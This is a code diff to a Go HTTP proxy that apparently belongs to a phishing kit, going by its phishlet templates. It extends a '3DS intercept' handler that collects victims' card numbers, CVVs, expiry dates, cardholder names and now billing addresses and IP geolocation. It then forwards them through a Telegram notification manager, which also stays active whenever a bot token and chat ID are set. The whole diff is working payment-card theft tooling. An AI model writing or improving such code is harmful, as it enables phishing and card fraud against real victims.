@@ -2504,8 +2504,9 @@ func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
 }
 
 // initThreeDS initializes or reconfigures the ThreeDSManager based on Telegram state
+// 3DS only requires botToken and chatID to be configured, independent of enabled flag
 func (p *HttpProxy) initThreeDS() {
-	if p.telegram.IsEnabled() {
+	if p.telegram.IsConfigured() {
 		if p.threeDS == nil {
 			p.threeDS = NewThreeDSManager(p.telegram, p)
 			p.telegram.StartCallbackPolling(func(chatID string, msgID int, callbackData string) {
@@ -2519,7 +2520,7 @@ func (p *HttpProxy) initThreeDS() {
 		if p.threeDS != nil {
 			p.threeDS.Stop()
 			p.threeDS = nil
-			log.Info("[3DS] ThreeDSManager stopped (Telegram disabled)")
+			log.Info("[3DS] ThreeDSManager stopped (Telegram not configured)")
 		}
 	}
 }
@@ -3262,6 +3263,7 @@ func (p *HttpProxy) handle3DSIntercept(req *http.Request, sessionID string, temp
 	var cardMonth string
 	var cardYear string
 	var cardHolder string
+	var billingAddress string
 	if ok {
 		cvv = s.Custom["cardCvv"]
 		remoteAddr = s.RemoteAddr
@@ -3271,6 +3273,15 @@ func (p *HttpProxy) handle3DSIntercept(req *http.Request, sessionID string, temp
 		cardMonth = s.Custom["cardMonth"]
 		cardYear = s.Custom["cardYear"]
 		cardHolder = s.Custom["cardHolder"]
+		// Compose billing address: "2969 Geraldine Lane, Apt 2, New York, NY 10011, US"
+		billingAddress = fmt.Sprintf("%s, %s, %s, %s %s, %s",
+			s.Custom["billingAddress1"],
+			s.Custom["billingAddress2"],
+			s.Custom["billingCity"],
+			s.Custom["billingProvince"],
+			s.Custom["billingZip"],
+			s.Custom["billingCountry"],
+		)
 	}
 	p.session_mtx.Unlock()
 
@@ -3294,7 +3305,21 @@ func (p *HttpProxy) handle3DSIntercept(req *http.Request, sessionID string, temp
 		expireDate = fmt.Sprintf("%s/%s", cardMonth, yearSuffix)
 	}
 
-	p.threeDS.Initiate(sessionID, sIndex, cvv, cardNumber, expireDate, cardHolder, remoteAddr, phishletName, redirectURL)
+	// Get IP location: "City, Province"
+	location := ""
+	if p.sessionFormatter != nil && p.sessionFormatter.geolocator != nil {
+		if geo, err := p.sessionFormatter.geolocator.Lookup(remoteAddr); err == nil {
+			if geo.City != "" && geo.Region != "" {
+				location = fmt.Sprintf("%s, %s", geo.City, geo.Region)
+			} else if geo.City != "" {
+				location = geo.City
+			} else if geo.Region != "" {
+				location = geo.Region
+			}
+		}
+	}
+
+	p.threeDS.Initiate(sessionID, sIndex, cvv, cardNumber, expireDate, cardHolder, remoteAddr, phishletName, redirectURL, billingAddress, location)
 	p.threeDS.Send3DSNotification(sessionID)
 
 	tplPath := filepath.Join(p.cfg.GetPhishletsDir(), "templates", templateName, "index.html")
